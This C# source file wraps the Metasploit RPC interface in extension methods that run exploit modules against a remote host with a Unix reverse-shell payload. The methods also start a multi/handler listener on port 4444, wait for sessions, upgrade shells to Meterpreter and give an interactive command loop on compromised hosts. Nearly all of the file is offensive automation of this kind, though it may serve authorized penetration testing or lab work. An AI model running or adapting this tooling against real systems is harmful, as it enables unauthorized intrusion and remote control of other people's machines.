using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Models.Modules;
using Lacey.Alexa.Common.Metasploit.Providers;
using Lacey.Medusa.Common.Core.Utils;

namespace Lacey.Alexa.Common.Metasploit.Extensions
{
    public static class ProviderExtensions
    {
        public static async Task Meterpreter(
            this IMetasploitProvider metasploit,
            string sessionId)
        {
            while (true)
            {
                Console.Write("$ ");
                var cmd = Console.ReadLine();
                if (cmd == "exit")
                {
                    await metasploit.StopSession(sessionId);
                    break;
                }

                await metasploit.WriteToSessionMeterpreter(sessionId, $"{cmd}{Environment.NewLine}");
                Delay.Small();
                await metasploit.ReadSessionMeterpreter(sessionId);
            }
        }

        public static async Task Shell(
            this IMetasploitProvider metasploit,
            string sessionId)
        {
            while (true)
            {
                Console.Write("$ ");
                var cmd = Console.ReadLine();
                if (cmd == "exit")
                {
                    await metasploit.StopSession(sessionId);
                    break;
                }

                await metasploit.WriteToSessionShell(sessionId, $"{cmd}{Environment.NewLine}");
                Delay.Tiny();
                await metasploit.ReadSessionShell(sessionId);
            }
        }

        public static async Task<string> ObtainSession(
            this IMetasploitProvider metasploit, 
            string moduleName,
            string jobId)
        {
            var response = await metasploit.ListJobs();
            var vals = new List<object>(response.Values);
            while (vals.Any(v => ((string)v).Contains(moduleName)))
            {
                Delay.Small();
                response = await metasploit.ListJobs();
                vals = new List<object>(response.Values);
            }

            await metasploit.StopJob(jobId);
            response = await metasploit.ListSessions();

            return response.First().Key;
        }

        public static async Task<string> ObtainMeterpreter(
            this IMetasploitProvider metasploit,
            string sessionId)
        {
            await metasploit.UpgradeShellToMeterpreter(sessionId,
                metasploit.MetasploitAddress,
                "4445");

            Delay.Small();

            var sessions = await metasploit.ListSessions();
            foreach (var session in sessions)
            {
                var id = session.Key;
                var dict = (Dictionary<string, object>)session.Value;
                if (dict["type"] as string == "meterpreter")
                {
                    return id;
                }
            }

            return null;
        }

        public static async Task<(Dictionary<string, object> Result, string JobId)> MultiHandler(
            this IMetasploitProvider metasploit)
        {
            var module = new MetasploitModule("exploit", "multi/handler")
                .LHost(metasploit.MetasploitAddress)
                .LPort(4444)
                .Payload("cmd/unix/reverse")
                .ExitOnSession(false);

            return await metasploit.ExecuteModuleJob(module);
        }

        public static async Task<Dictionary<string, object>> Exploit(
            this IMetasploitProvider metasploit,
            string moduleName,
            string rHost)
        {
            var module = new MetasploitModule("exploit", moduleName)
                .RHost(rHost)
                .LHost(metasploit.MetasploitAddress)
                .LPort(4444)
                .Payload("cmd/unix/reverse")
                .DisablePayloadHandler(true);

            return await metasploit.ExecuteModule(module);
        }

        public static async Task<(Dictionary<string, object> Result, string JobId)> ExecuteModuleJob(
            this IMetasploitProvider metasploit,
            MetasploitModule module)
        {
            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            var jobId = response["job_id"].ToString();
            return (response, jobId);
        }

        public static async Task<Dictionary<string, object>> ExecuteModule(
            this IMetasploitProvider metasploit,
            MetasploitModule module)
        {
            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            return response;
        }
    }
}